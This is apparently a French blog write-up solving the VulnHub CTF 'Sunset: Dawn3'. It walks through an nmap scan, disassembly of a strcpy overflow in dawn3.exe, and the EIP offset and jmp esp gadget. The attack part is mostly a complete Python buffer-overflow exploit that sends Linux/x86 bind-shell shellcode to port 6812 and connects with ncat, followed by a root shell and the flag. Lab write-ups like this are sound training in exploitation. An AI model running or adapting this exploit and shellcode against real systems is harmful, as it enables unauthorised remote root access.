---
title: "Solution du CTF Sunset: Dawn3 de VulnHub"
tags: [CTF, VulnHub, binary exploitation]
---

[Sunset: Dawn3](https://vulnhub.com/entry/sunset-dawn3,436/) était très proche de son prédécesseur. Le scénario est même encore moins civilisé : on trouve un port 2100 servant un FTP sur lequel est disponible un exécutable Windows.

```
Nmap scan report for 192.168.56.162
Host is up (0.00014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
2100/tcp open  ftp     pyftpdlib 1.5.6
6812/tcp open  unknown
```

Le port 6812 correspond à celui utilisé par le binaire dawn3.exe en question.

Ouvert avec `Cutter`, le programme est très proche de ce qu'on a [vu précédemment]({% link _posts/2023-04-08-Solution-du-CTF-Sunset-Dawn-2-de-VulnHub.md %}) avec après le `accept` l'appel à une fonction au nom explicite :

```nasm
_vulnerable_function (void *arg_4h);
; var const char *src @ stack - 0x218
; var char *dest @ stack - 0x20c
; arg void *arg_4h @ stack + 0x4
0x5250151f      push    ebp
0x52501520      mov     ebp, esp
0x52501522      sub     esp, 0x218
0x52501528      mov     eax, dword [arg_4h]
0x5250152b      mov     dword [src], eax ; const char *src
0x5250152f      lea     eax, [dest]
0x52501535      mov     dword [esp], eax ; char *dest
0x52501538      call    _strcpy    ; sym._strcpy ; char *strcpy(char *dest, const char *src)
0x5250153d      mov     eax, 1
0x52501542      leave
0x52501543      ret
```

J'envoie donc la chaine cyclique pour déterminer à quel offset on écrase EIP :

```
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xb7e0 
ECX: 0x42fa90 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
EDX: 0x0 
ESI: 0xa ('\n')
EDI: 0x55383c --> 0x0 
EBP: 0x66616166 ('faaf')
ESP: 0x42fca0 ("haafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaah"...)
EIP: 0x66616167 ('gaaf')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x66616167
[------------------------------------stack-------------------------------------]
```

Ici `eip` est à l'offset 524. Il ne nous reste plus qu'à trouver un gadget pointant sur `esp` ou `ecx` (tant que ça pointe sur une partie de la mémoire que l'on contrôle).

```
0x52501513 : jmp esp
```

J'ai donc repris et modifié l'exploit du précédent CTF :

```python
import sys
import os
import socket
from struct import pack

jmp_esp = 0x52501513

def exploit(ip, shellcode):
    sock = socket.socket()
    sock.connect((ip, 6812))
    buf = b"A" * 524 + pack("<I", jmp_esp) + shellcode + b"\0"
    sock.send(buf)
    sock.close()


# https://www.exploit-db.com/shellcodes/44602
# Linux/x86 - Bind (9443/TCP) Shell + fork() + Null-Free Shellcode (113 bytes)
shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8"
    b"\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3"
    b"\x66\xb8\x69\x01\x52\x66\x68"
    b"\x24\xe3"  # ==> port number = 9443; sock_ad.sin_port = htons(9443);
    b"\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66"
    b"\xb8\x6b\x01\x31\xc9\xcd\x80\x31\xd2\x31"
    b"\xf6\x66\xb8\x6c\x01\xcd\x80\x89\xc6\x31"
    b"\xc0\xb0\x02\xcd\x80\x31\xff\x39\xf8\x75"
    b"\xe8\x31\xc0\xb0\x06\xcd\x80\x89\xf3\xb1"
    b"\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31"
    b"\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68"
    b"\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1"
    b"\xb0\x0b\xcd\x80"
)


exploit(sys.argv[1], shellcode)
os.system(f"ncat {sys.argv[1]} 9443 -v")
```

Et on obtient directement le flag root :

```console
$ python exploit.py 192.168.56.162
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.162:9443.
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt
Thanks for playing! - Felipe Winsnes (@whitecr0wz)

3ca74b4afc790b46ff47fc2db5676b4f
```


